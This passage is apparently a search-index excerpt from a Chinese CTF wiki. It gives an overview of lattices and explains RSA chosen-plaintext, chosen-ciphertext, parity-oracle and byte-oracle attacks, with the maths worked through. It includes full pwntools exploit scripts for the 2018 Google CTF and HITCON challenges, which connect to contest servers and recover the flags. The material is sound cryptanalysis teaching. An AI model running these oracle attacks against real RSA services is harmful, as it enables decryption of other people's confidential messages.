\u5982\u4f55\u57fa\u4e8e\u683c\u56f0\u96be\u95ee\u9898\u8bbe\u8ba1\u65b0\u7684\u5bc6\u7801\u4f53\u5236\uff0c\u8fd9\u4e5f\u662f\u540e\u91cf\u5b50\u5bc6\u7801\u65f6\u4ee3\u7684\u91cd\u8981\u7814\u7a76\u65b9\u5411\u4e4b\u4e00\uff0c\u76ee\u524d\u6709\u4ee5\u4e0b\u7814\u7a76 Fully homomorphic encryption The Goldreich\u2013Goldwasser\u2013Halevi (GGH) cryptosystem The NTRU cryptosystem The Ajtai\u2013Dwork cryptosystem and the LWE cryptosystem","title":"\u683c\u6982\u8ff0"},{"location":"crypto/asymmetric/lattice/overview/#_1","text":"\u683c\u5728\u6570\u5b66\u4e0a\u81f3\u5c11\u6709\u4e24\u79cd\u542b\u4e49 \u5b9a\u4e49\u5728\u975e\u7a7a\u6709\u9650\u96c6\u5408\u4e0a\u7684\u504f\u5e8f\u96c6\u5408 L\uff0c\u6ee1\u8db3\u96c6\u5408 L \u4e2d\u7684\u4efb\u610f\u5143\u7d20 a\uff0cb\uff0c\u4f7f\u5f97 a\uff0cb \u5728 L \u4e2d\u5b58\u5728\u4e00\u4e2a\u6700\u5927\u4e0b\u754c\uff0c\u548c\u6700\u5c0f\u4e0a\u754c\u3002\u5177\u4f53\u53c2\u89c1https://en.wikipedia.org/wiki/Lattice_(order)\u3002 \u7fa4\u8bba\u4e2d\u7684\u5b9a\u4e49\uff0c\u662f R^n R^n \u4e2d\u7684\u6ee1\u8db3\u67d0\u79cd\u6027\u8d28\u7684\u5b50\u96c6\u3002\u5f53\u7136\uff0c\u4e5f\u53ef\u4ee5\u662f\u5176\u5b83\u7fa4\u3002 \u76ee\u524d\u5173\u4e8e\u683c\u65b9\u9762\u7684\u7814\u7a76\u4e3b\u8981\u6709\u4ee5\u4e0b\u51e0\u5927\u65b9\u5411 \u683c\u4e2d\u8ba1\u7b97\u95ee\u9898\u7684\u56f0\u96be\u6027\uff0c\u5373\u8fd9\u4e9b\u95ee\u9898\u7684\u8ba1\u7b97\u590d\u6742\u6027\uff0c\u4e3b\u8981\u5305\u62ec SVP \u95ee\u9898 CVP \u95ee\u9898 \u5982\u4f55\u6c42\u89e3\u683c\u4e2d\u7684\u56f0\u96be\u6027\u95ee\u9898\uff0c\u76ee\u524d\u65e2\u6709\u8fd1\u4f3c\u7b97\u6cd5\uff0c\u4e5f\u6709\u4e00\u4e9b\u7cbe\u786e\u6027\u7b97\u6cd5\u3002 \u57fa\u4e8e\u683c\u7684\u5bc6\u7801\u5206\u6790\uff0c\u5373\u5982\u4f55\u5229\u7528\u683c\u7406\u8bba\u5206\u6790\u4e00\u4e9b\u5df2\u6709\u7684\u5bc6\u7801\u5b66\u7b97\u6cd5\uff0c\u76ee\u524d\u6709\u5982\u4e0b\u7814\u7a76 Knapsack cryptosystems DSA nonce biases Factoring RSA keys with bits known Small RSA private exponents Stereotyped messages with small RSA exponents \u5982\u4f55\u57fa\u4e8e\u683c\u56f0\u96be\u95ee\u9898\u8bbe\u8ba1\u65b0\u7684\u5bc6\u7801\u4f53\u5236\uff0c\u8fd9\u4e5f\u662f\u540e\u91cf\u5b50\u5bc6\u7801\u65f6\u4ee3\u7684\u91cd\u8981\u7814\u7a76\u65b9\u5411\u4e4b\u4e00\uff0c\u76ee\u524d\u6709\u4ee5\u4e0b\u7814\u7a76 Fully homomorphic encryption The Goldreich\u2013Goldwasser\u2013Halevi (GGH) cryptosystem The NTRU cryptosystem The Ajtai\u2013Dwork cryptosystem and the LWE cryptosystem","title":"\u683c\u6982\u8ff0"},{"location":"crypto/asymmetric/rsa/rsa_chosen_plain_cipher/","text":"RSA \u9009\u62e9\u660e\u5bc6\u6587\u653b\u51fb \u00b6 \u9009\u62e9\u660e\u6587\u653b\u51fb \u00b6 \u8fd9\u91cc\u7ed9\u51fa\u4e00\u4e2a\u4f8b\u5b50\uff0c\u5047\u5982\u6211\u4eec\u6709\u4e00\u4e2a\u52a0\u5bc6 oracle \uff0c\u4f46\u662f\u6211\u4eec\u4e0d\u77e5\u9053 n \u548c e\uff0c\u90a3 \u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u52a0\u5bc6 oracle \u83b7\u53d6 n\u3002 \u5728 e \u6bd4\u8f83\u5c0f\uff08 e<2^{64} e<2^{64} \uff09\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528 Pollard\u2019s kangaroo algorithm \u7b97\u6cd5\u83b7\u53d6 e\u3002\u8fd9\u4e00\u70b9\u6bd4\u8f83\u663e\u7136\u3002 \u6211\u4eec\u53ef\u4ee5\u52a0\u5bc6 2\uff0c4\uff0c8\uff0c16\u3002\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u77e5\u9053 c_2=2^{e} \\bmod n c_2=2^{e} \\bmod n c_4=4^{e} \\bmod n c_4=4^{e} \\bmod n c_8=8^{e} \\bmod n c_8=8^{e} \\bmod n \u90a3\u4e48 c_2^2 \\equiv c_4 \\bmod n c_2^2 \\equiv c_4 \\bmod n c_2^3 \\equiv c_8 \\bmod n c_2^3 \\equiv c_8 \\bmod n \u6545\u800c c_2^2-c_4=kn c_2^2-c_4=kn c_2^3-c_8=tn c_2^3-c_8=tn \u6211\u4eec\u53ef\u4ee5\u6c42\u51fa kn \u548c tn \u7684\u6700\u5927\u516c\u56e0\u6570\uff0c\u5f88\u5927\u6982\u7387\u5c31\u662f n \u4e86\u3002\u6211\u4eec\u8fd8\u53ef\u4ee5\u6784\u9020\u66f4\u591a\u7684\u4f8b\u5b50\u4ece\u6765\u66f4\u52a0\u786e\u5b9a\u6027\u5730\u627e n\u3002 \u4efb\u610f\u5bc6\u6587\u89e3\u5bc6 \u00b6 \u5047\u8bbe\u7231\u4e3d\u4e1d\u521b\u5efa\u4e86\u5bc6\u6587 C = P^e \\bmod n C = P^e \\bmod n \u5e76\u4e14\u628a C \u53d1\u9001\u7ed9\u9c8d\u52c3\uff0c\u540c\u65f6\u5047\u8bbe\u6211\u4eec\u8981\u5bf9\u7231\u4e3d\u4e1d\u52a0\u5bc6\u540e\u7684\u4efb\u610f\u5bc6\u6587\u89e3\u5bc6\uff0c\u800c\u4e0d\u662f\u53ea\u89e3\u5bc6 C\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u62e6\u622a C\uff0c\u5e76\u8fd0\u7528\u4e0b\u5217\u6b65\u9aa4\u6c42\u51fa P\uff1a \u9009\u62e9\u4efb\u610f\u7684 X\\in Z_n^{*} X\\in Z_n^{*} \uff0c\u5373 X \u4e0e N \u4e92\u7d20 \u8ba1\u7b97 Y=C \\times X^e \\bmod n Y=C \\times X^e \\bmod n \u7531\u4e8e\u6211\u4eec\u53ef\u4ee5\u8fdb\u884c\u9009\u62e9\u5bc6\u6587\u653b\u51fb\uff0c\u90a3\u4e48\u6211\u4eec\u6c42\u5f97 Y \u5bf9\u5e94\u7684\u89e3\u5bc6\u7ed3\u679c Z=Y^d Z=Y^d \u90a3\u4e48\uff0c\u7531\u4e8e Z=Y^d=(C \\times X^e)^d=C^d X=P^{ed} X= P X\\bmod n Z=Y^d=(C \\times X^e)^d=C^d X=P^{ed} X= P X\\bmod n \uff0c\u7531\u4e8e X \u4e0e N \u4e92\u7d20\uff0c\u6211\u4eec\u5f88\u5bb9\u6613\u6c42\u5f97\u76f8\u5e94\u7684\u9006\u5143\uff0c\u8fdb\u800c\u53ef\u4ee5\u5f97\u5230 P RSA parity oracle \u00b6 \u5047\u8bbe\u76ee\u524d\u5b58\u5728\u4e00\u4e2a Oracle\uff0c\u5b83\u4f1a\u5bf9\u4e00\u4e2a\u7ed9\u5b9a\u7684\u5bc6\u6587\u8fdb\u884c\u89e3\u5bc6\uff0c\u5e76\u4e14\u4f1a\u68c0\u67e5\u89e3\u5bc6\u7684\u660e\u6587\u7684\u5947\u5076\u6027\uff0c\u5e76\u6839\u636e\u5947\u5076\u6027\u8fd4\u56de\u76f8\u5e94\u7684\u503c\uff0c\u6bd4\u5982 1 \u8868\u793a\u5947\u6570\uff0c0 \u8868\u793a\u5076\u6570\u3002\u90a3\u4e48\u7ed9\u5b9a\u4e00\u4e2a\u52a0\u5bc6\u540e\u7684\u5bc6\u6587\uff0c\u6211\u4eec\u53ea\u9700\u8981 log(N) \u6b21\u5c31\u53ef\u4ee5\u77e5\u9053\u8fd9\u4e2a\u5bc6\u6587\u5bf9\u5e94\u7684\u660e\u6587\u6d88\u606f\u3002 \u539f\u7406 \u00b6 \u5047\u8bbe C=P^e \\bmod N C=P^e \\bmod N \u7b2c\u4e00\u6b21\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u7ed9\u670d\u52a1\u5668\u53d1\u9001 C*2^e=(2P)^e \\bmod N C*2^e=(2P)^e \\bmod N \u670d\u52a1\u5668\u4f1a\u8ba1\u7b97\u5f97\u5230 2P \\bmod N 2P \\bmod N \u8fd9\u91cc 2P \u662f\u5076\u6570\uff0c\u5b83\u7684\u5e42\u6b21\u4e5f\u662f\u5076\u6570\u3002 N \u662f\u5947\u6570\uff0c\u56e0\u4e3a\u5b83\u662f\u7531\u4e24\u4e2a\u5927\u7d20\u6570\u76f8\u4e58\u5f97\u5230\u3002 \u90a3\u4e48 \u670d\u52a1\u5668\u8fd4\u56de\u5947\u6570\uff0c\u5373 2P \\bmod N 2P \\bmod N \u4e3a\u5947\u6570\uff0c\u5219\u8bf4\u660e 2P \u5927\u4e8e N\uff0c\u4e14\u51cf\u53bb\u4e86\u5947\u6570\u4e2a N\uff0c\u53c8\u56e0\u4e3a 2P<2N 2P<2N \uff0c\u56e0\u6b64\u51cf\u53bb\u4e86\u4e00\u4e2aN\uff0c \u5373 \\frac{N}{2} \\leq P < N \\frac{N}{2} \\leq P < N \uff0c\u6211\u4eec\u8fd8\u53ef\u4ee5\u8003\u8651\u5411\u4e0b\u53d6\u6574\u3002 \u670d\u52a1\u5668\u8fd4\u56de\u5076\u6570\uff0c\u5219\u8bf4\u660e 2P \u5c0f\u4e8e N\u3002\u5373 0\\leq P < \\frac{N}{2} 0\\leq P < \\frac{N}{2} \uff0c\u6211\u4eec\u8fd8\u53ef\u4ee5\u5411\u4e0b\u53d6\u6574\u3002 \u8fd9\u91cc\u6211\u4eec\u4f7f\u7528\u6570\u5b66\u5f52\u7eb3\u6cd5\uff0c\u5373\u5047\u8bbe\u5728\u7b2c i \u6b21\u65f6\uff0c \\frac{xN}{2^{i}} \\leq P < \\frac{xN+N}{2^{i}} \\frac{xN}{2^{i}} \\leq P < \\frac{xN+N}{2^{i}} \u8fdb\u4e00\u6b65\uff0c\u5728\u7b2c i+1 \u6b21\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u53d1\u9001 C*2^{(i+1)e} C*2^{(i+1)e} \u670d\u52a1\u5668\u4f1a\u8ba1\u7b97\u5f97\u5230 2^{i+1}P \\bmod N=2^{i+1}P-kN 2^{i+1}P \\bmod N=2^{i+1}P-kN 0 \\leq 2^{i+1}P-kN<N 0 \\leq 2^{i+1}P-kN<N \\frac{kN}{2^{i+1}} \\leq P < \\frac{kN+N}{2^{i+1}} \\frac{kN}{2^{i+1}} \\leq P < \\frac{kN+N}{2^{i+1}} \u6839\u636e\u7b2c i \u6b21\u7684\u7ed3\u679c \\frac{2xN}{2^{i+1}} \\leq P < \\frac{2xN+2N}{2^{i+1}} \\frac{2xN}{2^{i+1}} \\leq P < \\frac{2xN+2N}{2^{i+1}} \u90a3\u4e48 \u670d\u52a1\u5668\u8fd4\u56de\u5947\u6570\uff0c\u5219 k \u5fc5\u7136\u662f\u4e00\u4e2a\u5947\u6570\uff0ck=2y+1\uff0c \u90a3\u4e48 \\frac{2yN+N}{2^{i+1}} \\leq P < \\frac{2yN+2N}{2^{i+1}} \\frac{2yN+N}{2^{i+1}} \\leq P < \\frac{2yN+2N}{2^{i+1}} \u3002\u4e0e\u6b64\u540c\u65f6\uff0c\u7531\u4e8e P \u5fc5\u7136\u5b58\u5728\uff0c\u6240\u4ee5\u7b2c i+1 \u5f97\u5230\u7684\u8fd9\u4e2a\u8303\u56f4\u548c\u7b2c i \u6b21\u5f97\u5230\u7684\u8303\u56f4\u5fc5\u7136\u5b58\u5728\u4ea4\u96c6\u3002\u6240\u4ee5 y \u5fc5\u7136\u4e0e x \u76f8\u7b49\u3002 \u670d\u52a1\u5668\u8fd4\u56de\u5076\u6570\uff0c\u5219 k \u5fc5\u7136\u662f\u4e00\u4e2a\u5076\u6570\uff0ck=2y\uff0c\u6b64\u65f6 y \u5fc5\u7136\u4e5f\u4e0e x \u76f8\u7b49\uff0c\u90a3\u4e48 \\frac{2xN}{2^{i+1}} \\leq P < \\frac{2xN+N}{2^{i+1}} \\frac{2xN}{2^{i+1}} \\leq P < \\frac{2xN+N}{2^{i+1}} \u8fdb\u4e00\u6b65\u6211\u4eec\u53ef\u4ee5\u8fd9\u4e48\u5f52\u7eb3 lb = 0 ub = N if server returns 1 lb = ( lb + ub ) / 2 else : ub = ( lb + ub ) / 2 \u8fd9\u91cc\u867d\u7136\u662f\u6574\u9664\uff0c \u5373\u4e0b\u53d6\u6574\uff0c\u4f46\u662f\u65e0\u6240\u8c13\u6211\u4eec\u5728\u6700\u521d\u65f6\u5df2\u7ecf\u5206\u6790\u4e86\u8fd9\u4e2a\u95ee\u9898\u3002 2018 Google CTF Perfect Secrecy \u00b6 \u8fd9\u91cc\u4ee5 2018 \u5e74 Google CTF \u7684\u9898\u76ee\u4e3a\u4f8b\u8fdb\u884c\u5206\u6790 #!/usr/bin/env python3 import sys import random from cryptography.hazmat.primitives import serialization from cryptography.hazmat.backends import default_backend def ReadPrivateKey ( filename ): return serialization . load_pem_private_key ( open ( filename , 'rb' ) . read (), password = None , backend = default_backend ()) def RsaDecrypt ( private_key , ciphertext ): assert ( len ( ciphertext ) <= ( private_key . public_key () . key_size // 8 )), 'Ciphertext too large' return pow ( int . from_bytes ( ciphertext , 'big' ), private_key . private_numbers () . d , private_key . public_key () . public_numbers () . n ) def Challenge ( private_key , reader , writer ): try : m0 = reader . read ( 1 ) m1 = reader . read ( 1 ) ciphertext = reader . read ( private_key . public_key () . key_size // 8 ) dice = RsaDecrypt ( private_key , ciphertext ) for rounds in range ( 100 ): p = [ m0 , m1 ][ dice & 1 ] k = random . randint ( 0 , 2 ) c = ( ord ( p ) + k ) % 2 writer . write ( bytes (( c ,))) writer . flush () return 0 except Exception as e : return 1 def main (): private_key = ReadPrivateKey ( sys . argv [ 1 ]) return Challenge ( private_key , sys . stdin . buffer , sys . stdout . buffer ) if __name__ == '__main__' : sys . exit ( main ()) \u53ef\u4ee5\u770b\u51fa \u6211\u4eec\u53ef\u4ee5\u7ed9\u670d\u52a1\u5668\u4e24\u4e2a\u6570\uff0c\u670d\u52a1\u5668\u4f1a\u6839\u636e\u89e3\u5bc6\u540e\u7684\u5bc6\u6587\u5185\u5bb9\u6765\u51b3\u5b9a\u4f7f\u7528\u54ea\u4e00\u4e2a\u3002 \u670d\u52a1\u5668\u4f1a\u4f7f\u7528 random.randint(0, 2) \u6765\u751f\u6210\u968f\u673a\u6570\uff0c\u5e76\u8f93\u51fa\u76f8\u5173\u7684\u968f\u673a 01 \u5b57\u8282 c\u3002 \u4e4d\u4e00\u770b\uff0c\u4f3c\u4e4e\u662f\u5b8c\u5168\u968f\u673a\u7684\uff0c\u4ed4\u7ec6\u67e5\u4e00\u4e0b random.randint(0, 2) \u53ef\u4ee5\u77e5\u9053\u5176\u751f\u6210\u968f\u673a\u6570\u662f\u5305\u62ec\u8fb9\u754c\u7684\uff0c\u56e0\u6b64\u5176\u751f\u6210\u5076\u6570\u7684\u6982\u7387\u5927\u4e8e\u751f\u6210\u5947\u6570\u7684\u6982\u7387\uff0c\u90a3\u4e48 c \u4e0e p \u540c\u5947\u5076\u7684\u6982\u7387\u4e3a \u2154\u3002\u8fdb\u800c\u6211\u4eec\u901a\u8fc7\u8bbe\u7f6e m0 \u548c m1 \u5c31\u53ef\u4ee5\u77e5\u9053\u89e3\u5bc6\u540e\u7684\u5bc6\u6587\u7684\u6700\u540e\u4e00\u4f4d\u662f 0 \u8fd8\u662f 1 \u3002\u8fd9\u5176\u5b9e\u5c31\u662f RSA parity oracle\u3002 exp \u5982\u4e0b import gmpy2 from pwn import * encflag = open ( './flag.txt' ) . read () encflag = encflag . encode ( 'hex' ) encflag = int ( encflag , 16 ) #context.log_level = 'debug' m = [ ' \\x00 ' , ' \\x07 ' ] n = 0xDA53A899D5573091AF6CC9C9A9FC315F76402C8970BBB1986BFE8E29CED12D0ADF61B21D6C281CCBF2EFED79AA7DD23A2776B03503B1AF354E35BF58C91DB7D7C62F6B92C918C90B68859C77CAE9FDB314F82490A0D6B50C5DC85F5C92A6FDF19716AC8451EFE8BBDF488AE098A7C76ADD2599F2CA642073AFA20D143AF403D1 e = 65537 flag = \"\" def guessvalue ( cnt ): if cnt [ 0 ] > cnt [ 1 ]: return 0 return 1 i = 0 while True : cnt = dict () cnt [ 0 ] = cnt [ 1 ] = 0 p = remote ( 'perfect-secrecy.ctfcompetition.com' , 1337 ) p . send ( m [ 0 ]) p . send ( m [ 1 ]) tmp = pow ( 2 , i ) two_inv = gmpy2 . invert ( tmp , n ) two_cipher = gmpy2 . powmod ( two_inv , e , n ) tmp = encflag * two_cipher % n tmp = hex ( tmp )[ 2 :] . strip ( 'L' ) tmp = '0' * ( 256 - len ( tmp )) + tmp tmp = tmp . decode ( 'hex' ) assert ( len ( tmp ) == 128 ) p . send ( tmp ) #print tmp data = \"\" while ( len ( data ) != 100 ): data += p . recv () for c in data : cnt [ u8 ( c )] += 1 p . close () flag = str ( guessvalue ( cnt )) + flag print i , flag i += 1 \u7ed3\u679c\u5982\u4e0bu89e3\u7801\u540e\u5c31\u53ef\u4ee5\u5f97\u5230 flag CTF { h3ll0__17_5_m3_1_w45_w0nd3r1n6_1f_4f73r_4ll_7h353_y34r5_y0u_d_l1k3_70_m337 } \u9898\u76ee \u00b6 2016 Plaid CTF rabit 2016 sharif CTF lsb-oracle-150 2018 Backdoor CTF BIT-LEAKER 2018 XMAN \u9009\u62d4\u8d5b baby RSA RSA Byte Oracle \u00b6 \u5047\u8bbe\u76ee\u524d\u5b58\u5728\u4e00\u4e2a Oracle\uff0c\u5b83\u4f1a\u5bf9\u4e00\u4e2a\u7ed9\u5b9a\u7684\u5bc6\u6587\u8fdb\u884c\u89e3\u5bc6\uff0c\u5e76\u4e14\u4f1a\u7ed9\u51fa\u660e\u6587\u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u3002\u90a3\u4e48\u7ed9\u5b9a\u4e00\u4e2a\u52a0\u5bc6\u540e\u7684\u5bc6\u6587\uff0c\u6211\u4eec\u53ea\u9700\u8981 \\log_{256}n \\log_{256}n \u6b21\u5c31\u53ef\u4ee5\u77e5\u9053\u8fd9\u4e2a\u5bc6\u6587\u5bf9\u5e94\u7684\u660e\u6587\u6d88\u606f\u3002 \u539f\u7406 \u00b6 \u8fd9\u4e2a\u5176\u5b9e\u7b97\u4f5c RSA parity Oracle \u7684\u6269\u5c55\uff0c\u65e2\u7136\u53ef\u4ee5\u6cc4\u9732\u51fa\u6700\u540e\u4e00\u4e2a\u5b57\u8282\uff0c\u90a3\u4e48\u6309\u9053\u7406\u6211\u4eec\u83b7\u53d6\u5bc6\u6587\u5bf9\u5e94\u660e\u6587\u7684\u6b21\u6570\u5e94\u8be5\u53ef\u4ee5\u51cf\u5c11\u3002 \u5047\u8bbe C=P^e \\bmod N C=P^e \\bmod N \u7b2c\u4e00\u6b21\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u7ed9\u670d\u52a1\u5668\u53d1\u9001 C*256^e=(256P)^e \\bmod N C*256^e=(256P)^e \\bmod N \u670d\u52a1\u5668\u4f1a\u8ba1\u7b97\u5f97\u5230 256P \\bmod N 256P \\bmod N \u8fd9\u91cc 256P \u662f\u5076\u6570\u3002 N \u662f\u5947\u6570\uff0c\u56e0\u4e3a\u5b83\u662f\u7531\u4e24\u4e2a\u5927\u7d20\u6570\u76f8\u4e58\u5f97\u5230\u3002 \u7531\u4e8e P \u4e00\u822c\u662f\u5c0f\u4e8e N \u7684\uff0c\u90a3\u4e48 256P \\bmod N=256P-kn, k<256 256P \\bmod N=256P-kn, k<256 \u3002\u800c\u4e14\u5bf9\u4e8e\u4e24\u4e2a\u4e0d\u540c\u7684 k_1,k_2 k_1,k_2 \uff0c\u6211\u4eec\u6709 256P-k_1n \\not\\equiv 256P-k_2n \\bmod 256 256P-k_1n \\not\\equiv 256P-k_2n \\bmod 256 \u6211\u4eec\u53ef\u4ee5\u5229\u7528\u53cd\u8bc1\u6cd5\u6765\u8bc1\u660e\u4e0a\u8ff0\u4e0d\u7b49\u5f0f\u3002\u540c\u65f6 256P-kn 256P-kn \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u5176\u5b9e\u5c31\u662f -kn -kn \u5728\u6a21 256 \u7684\u60c5\u51b5\u4e0b\u83b7\u53d6\u7684\u3002\u90a3\u4e48\uff0c\u5176\u5b9e\u6211\u4eec\u53ef\u4ee5\u9996\u5148\u679a\u4e3e\u51fa 0~255 \u60c5\u51b5\u4e0b\u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\uff0c\u6784\u9020\u4e00\u4e2a k \u548c\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u7684\u6620\u5c04\u8868 map \u5f53\u670d\u52a1\u5668\u8fd4\u56de\u6700\u540e\u4e00\u4e2a\u5b57\u8282 b\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u6839\u636e\u4e0a\u8ff0\u6784\u9020\u7684\u6620\u5c04\u8868\u5f97\u77e5 k\uff0c\u5373\u51cf\u53bb\u4e86 k \u4e2aN\uff0c \u5373 kN \\leq 256 P \\leq (k+1)N kN \\leq 256 P \\leq (k+1)N \u3002 \u6b64\u540e\uff0c\u6211\u4eec\u4f7f\u7528\u6570\u5b66\u5f52\u7eb3\u6cd5\u6765\u83b7\u53d6 P \u7684\u8303\u56f4\uff0c\u5373\u5047\u8bbe\u5728\u7b2c i \u6b21\u65f6\uff0c \\frac{xN}{256^{i}} \\leq P < \\frac{xN+N}{256^{i}} \\frac{xN}{256^{i}} \\leq P < \\frac{xN+N}{256^{i}} \u8fdb\u4e00\u6b65\uff0c\u5728\u7b2c i+1 \u6b21\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u53d1\u9001 C*256^{(i+1)e} C*256^{(i+1)e} \u670d\u52a1\u5668\u4f1a\u8ba1\u7b97\u5f97\u5230 256^{i+1}P \\bmod N=256^{i+1}P-kN 256^{i+1}P \\bmod N=256^{i+1}P-kN 0 \\leq 256^{i+1}P-kN<N 0 \\leq 256^{i+1}P-kN<N \\frac{kN}{256^{i+1}} \\leq P < \\frac{kN+N}{256^{i+1}} \\frac{kN}{256^{i+1}} \\leq P < \\frac{kN+N}{256^{i+1}} \u6839\u636e\u7b2c i \u6b21\u7684\u7ed3\u679c \\frac{256xN}{256^{i+1}} \\leq P < \\frac{256xN+256N}{256^{i+1}} \\frac{256xN}{256^{i+1}} \\leq P < \\frac{256xN+256N}{256^{i+1}} \u6211\u4eec\u8fd9\u91cc\u53ef\u4ee5\u5047\u8bbe k=256y+t k=256y+t \uff0c \u800c\u8fd9\u91cc\u7684 t \u5c31\u662f\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u6620\u5c04\u8868\u83b7\u53d6\u7684\u3002 \\frac{256yN+tN}{256^{i+1}} \\leq P < \\frac{256yN+(t+1)N}{256^{i+1}} \\frac{256yN+tN}{256^{i+1}} \\leq P < \\frac{256yN+(t+1)N}{256^{i+1}} \u4e0e\u6b64\u540c\u65f6\uff0c\u7531\u4e8e P \u5fc5\u7136\u5b58\u5728\uff0c\u6240\u4ee5\u7b2c i+1 \u5f97\u5230\u7684\u8fd9\u4e2a\u8303\u56f4\u548c\u7b2c i \u6b21\u5f97\u5230\u7684\u8303\u56f4\u5fc5\u7136\u5b58\u5728\u4ea4\u96c6\u3002 \u6240\u4ee5 y \u5fc5\u7136\u4e0e x \u76f8\u7b49\u3002 \u8fdb\u4e00\u6b65\u6211\u4eec\u53ef\u4ee5\u8fd9\u4e48\u5f52\u7eb3\uff0c\u521d\u59cb\u60c5\u51b5\u4e0b lb = 0 ub = N \u5047\u8bbe\u670d\u52a1\u5668\u8fd4\u56de\u4e86 b\uff0c\u90a3\u4e48 k = mab [ b ] interval = ( ub - lb ) / 256 lb = lb + interval * k ub = lb + interval 2018 HITCON lost key \u00b6 \u8fd9\u662f\u4e00\u4e2a\u7efc\u5408\u9898\u76ee\uff0c\u9996\u5148\u6ca1\u6709\u7ed9\u51fa n\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u9009\u62e9\u660e\u6587\u653b\u51fb\u7684\u65b9\u5f0f\u83b7\u53d6 n\uff0c\u5f53\u7136\u6211\u4eec\u4e5f\u53ef\u4ee5\u8fdb\u4e00\u6b65\u83b7\u53d6 e\uff0c\u6700\u540e\u5229\u7528\u4ee3\u7801\u5982\u4e0b from pwn import * import gmpy2 from fractions import Fraction p = process ( './rsa.py' ) #p = remote('18.179.251.168', 21700) #context.log_level = 'debug' p . recvuntil ( 'Here is the flag! \\n ' ) flagcipher = int ( p . recvuntil ( ' \\n ' , drop = True ), 16 ) def long_to_hex ( n ): s = hex ( n )[ 2 :] . rstrip ( 'L' ) if len ( s ) % 2 : s = '0' + s return s def send ( ch , num ): p . sendlineafter ( 'cmd: ' , ch ) p . sendlineafter ( 'input: ' , long_to_hex ( num )) data = p . recvuntil ( ' \\n ' ) return int ( data , 16 ) if __name__ == \"__main__\" : # get n cipher2 = send ( 'A' , 2 ) cipher4 = send ( 'A' , 4 ) nset = [] nset . append ( cipher2 * cipher2 - cipher4 ) cipher3 = send ( 'A' , 3 ) cipher9 = send ( 'A' , 9 ) nset . append ( cipher3 * cipher3 - cipher9 ) cipher5 = send ( 'A' , 5 ) cipher25 = send ( 'A' , 25 ) nset . append ( cipher5 * cipher5 - cipher25 ) n = nset [ 0 ] for item in nset : n = gmpy2 . gcd ( item , n ) # get map between k and return byte submap = {} for i in range ( 0 , 256 ): submap [ - n * i % 256 ] = i # get cipher256 cipher256 = send ( 'A' , 256 ) back = flagcipher L = Fraction ( 0 , 1 ) R = Fraction ( 1 , 1 ) for i in range ( 128 ): print i flagcipher = flagcipher * cipher256 % n b = send ( 'B' , flagcipher ) k = submap [ b ] L , R = L + ( R - L ) * Fraction ( k , 256 ), L + ( R - L ) * Fraction ( k + 1 , 256 ) low = int ( L * n ) print long_to_hex ( low - low % 256 + send ( 'B' , back )) . decode ( 'hex' ) RSA parity oracle variant \u00b6 \u539f\u7406 \u00b6 \u5982\u679coracle\u7684\u53c2\u6570\u4f1a\u5728\u4e00\u5b9a\u65f6\u95f4\u3001\u8fd0\u884c\u5468\u671f\u540e\u6539\u53d8\uff0c\u6216\u8005\u7f51\u7edc\u4e0d\u7a33\u5b9a\u5bfc\u81f4\u4f1a\u8bdd\u65ad\u5f00\u3001\u91cd\u7f6e\uff0c\u4e8c\u5206\u6cd5\u5c31\u4e0d\u518d\u9002\u7528\u4e86\uff0c\u4e3a\u4e86\u51cf\u5c11\u9519\u8bef\uff0c\u5e94\u5f53\u8003\u8651\u9010\u4f4d\u6062\u590d\u3002 \u8981\u6062\u590d\u660e\u6587\u7684\u7b2c2\u4f4e\u4f4d\uff0c\u8003\u8651 \\{(c(2^{-1*e_1}\\mod N_1))^{d_1}\\mod N_1\\}\\pmod2\\equiv m*2^{-1} \\{(c(2^{-1*e_1}\\mod N_1))^{d_1}\\mod N_1\\}\\pmod2\\equiv m*2^{-1} \\begin{aligned} &m*(2^{-1}\\mod N_1)\\mod2\\\\ &=(\\displaystyle\\sum_{i=0}^{logm-1}a_i*2^i)*2^{-1}\\mod2\\\\ &=[2(\\displaystyle\\sum_{i=1}^{logm-1}a_i*2^{i-1})+a_0*2^0]*2^{-1}\\mod 2\\\\ &=\\displaystyle\\sum_{i=1}^{logm-1}a_i*2^{i-1}+a_0*2^0*2^{-1}\\mod2\\\\ &\\equiv a_1+a_0*2^0*2^{-1}\\equiv y\\pmod2 \\end{aligned} \\begin{aligned} &m*(2^{-1}\\mod N_1)\\mod2\\\\ &=(\\displaystyle\\sum_{i=0}^{logm-1}a_i*2^i)*2^{-1}\\mod2\\\\ &=[2(\\displaystyle\\sum_{i=1}^{logm-1}a_i*2^{i-1})+a_0*2^0]*2^{-1}\\mod 2\\\\ &=\\displaystyle\\sum_{i=1}^{logm-1}a_i*2^{i-1}+a_0*2^0*2^{-1}\\mod2\\\\ &\\equiv a_1+a_0*2^0*2^{-1}\\equiv y\\pmod2 \\end{aligned} y-(a_0*2^0)*2^{-1}=(m*2^{-1}\\mod2)-(a_0*2^0)*2^{-1}\\equiv a_1\\pmod2 y-(a_0*2^0)*2^{-1}=(m*2^{-1}\\mod2)-(a_0*2^0)*2^{-1}\\equiv a_1\\pmod2 \u7c7b\u4f3c\u7684 \\{(c(2^{-2*e_2}\\mod N_2))^{d_2}\\mod N_2\\}\\pmod2\\equiv m*2^{-2} \\{(c(2^{-2*e_2}\\mod N_2))^{d_2}\\mod N_2\\}\\pmod2\\equiv m*2^{-2} \\begin{aligned} &m*(2^{-2}\\mod N_2)\\mod2\\\\ &=(\\displaystyle\\sum_{i=0}^{logm-1}a_i*2^i)*2^{-2}\\mod2\\\\ &=[2^2(\\displaystyle\\sum_{i=2}^{logm-1}a_i*2^{i-2})+a_1*2^1+a_0*2^0]*2^{-2}\\mod 2\\\\ 